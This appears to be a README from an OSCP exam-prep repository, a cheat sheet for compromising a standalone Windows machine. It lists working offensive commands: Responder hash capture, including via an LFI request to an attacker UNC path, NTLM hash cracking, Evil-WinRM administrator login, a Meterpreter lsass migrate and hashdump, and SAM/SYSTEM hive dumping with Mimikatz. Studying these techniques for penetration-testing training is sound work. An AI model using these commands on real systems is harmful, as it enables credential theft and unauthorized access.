# Windows Resources 
Use this folder for triaging and compromising a standalone Windows box. For domain compromising, see [Active_Directory](https://github.com/Scr1ptK1ddie/OSCPprep/tree/main/ActiveDirectory) folder.   
## Contents 
- [Windows Resources](#windows-resources)
  * [Contents](#contents)
  * [Tools](#tools)
    + [Impacket](#impacket)
    + [Responder (not allowed on the OSCP exam, but a common pen testing tool)](#responder--not-allowed-on-the-oscp-exam--but-a-common-pen-testing-tool-)
    + [Evil-WinRM](#evil-winrm)
    + [Metasploit and Meterpreter](#metasploit-and-meterpreter)

## Tools
### Impacket 
https://github.com/SecureAuthCorp/impacket

    apt install impacket-scripts

Local Locations:

    /usr/share/doc/python3-impacket/examples   
    
### Responder (not allowed on the OSCP exam, but a common pen testing tool)   
Allows you to spoof various services then capture hashes from devices that try to authenticate to those.  
Install:   

    git clone https://github.com/lgandx/Responder   
 Usage:   

     sudo responder.py -I eth0   #start on specified interface. Hashes will be captured when a device tries to authenticate to resources on the network.               
    
You might be able to use a LFI vulnerability to request a resource and capture a hash using Responder. Ex - http://site.com/?page=//10.10.14.25/somefile           
Captured hashes will be stored in the logs folder, in a .txt file named for the protcol-hash type- and IP captured from.     
Crack Hashes from responder:     

    john hashes.txt   #John the Ripper will automatically detect the format of hashes collected by Responder.    
    hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
    hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   
    
### Evil-WinRM
Access port 5985. Use with a username / password or username / hash. 

    $ evil-winrm -u Administrator -p password -i 10.10.10.10    

### Metasploit and Meterpreter   
Meterpreter shell: need to migrate to lsass process to dump hashes, due to process permissions on Windows.         
    
    meter > migrate -N lsasse.exe       
    meter > hashdump     
    
### Dump Hives and Extract with Mimikatz     

    C:\Temp> reg save hklm\sam sam.hive && reg save hklm\system system.hiv     
    C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"   
